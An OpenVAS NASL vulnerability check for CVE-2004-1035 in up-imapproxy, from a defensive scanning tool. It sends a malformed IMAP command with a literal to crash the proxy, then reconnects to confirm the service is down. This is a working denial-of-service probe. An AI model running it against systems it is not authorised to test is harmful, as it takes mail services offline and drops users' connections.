# OpenVAS Vulnerability Test
# $Id: imapproxy_literal_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: up-imapproxy Literal DoS Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>.
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running at least one instance of up-imapproxy that does
not properly handle IMAP literals.  This flaw allows a remote attacker
to crash the proxy, killing existing connections as well as preventing
new ones, by using literals at unexpected times.";

tag_solution = "Upgrade to up-imapproxy 1.2.3rc2 or later.";

if (description) {
  script_oid("1.3.6.1.4.1.25623.1.0.15853");
  script_version("$Revision: 9348 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");

  script_cve_id("CVE-2004-1035");
  script_bugtraq_id(11630);
  script_xref(name:"OSVDB", value:"11584");

  name = "up-imapproxy Literal DoS Vulnerability";
  script_name(name);
 
  summary = "Checks for Literal DoS Vulnerability in up-imapproxy";
 
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 George A. Theall");

  family = "Denial of Service";
  script_family(family);

  script_dependencies("find_service.nasl", "global_settings.nasl");
  script_require_ports("Services/imap", 143);

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("global_settings.inc");

port = get_kb_item("Services/imap");
if (!port) port = 143;
debug_print("checking for Literal DoS Vulnerability in up-imapproxy on port ", port, ".");
if (!get_port_state(port)) exit(0);
# nb: skip it if traffic is encrypted since uw-imapproxy only
#     supports TLS when acting as a client.
encaps = get_port_transport(port);
if (encaps > ENCAPS_IP) exit(0);


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);

# Read banner.
s = recv_line(socket:soc, length:1024);
if (!strlen(s)) {
  close(soc);
  exit(0);
}
s = chomp(s);
debug_print("S: '", s, "'.");

# Try to crash the service by sending an invalid command with a literal.
++tag;
c = string("a", string(tag), " openvas is testing {1}");
debug_print("C: '", c, "'.");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  debug_print("S: '", s, "'.");
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp='';
}
if (resp && resp =~ "BAD") {
  c = "up-imapproxy";
  debug_print("C: '", c, "'.");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    debug_print("S: '", s, "'.");
    # nb: the pattern changes since an unproxied service will echo a line
    #     like "up-imapproxy BAD Missing command".
    m = eregmatch(pattern:"^[^ ]+ (OK|BAD|NO)", string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp='';
  }
  # If we didn't get a response, make sure the service is truly down.
  if (!resp) {
    debug_print("no response received.");
    close(soc);
    soc = open_sock_tcp(port);
    if (!soc) {
      debug_print("imap service is down.");
      security_message(port);
      exit(0);
    }
    else {
      debug_print("imap service is up -- huh?");
    }
  }
}

# Logout.
++tag;
c = string("a", string(tag), " LOGOUT");
debug_print("C: '", c, "'.");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  debug_print("S: '", s, "'.");
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = "";
}
close(soc);
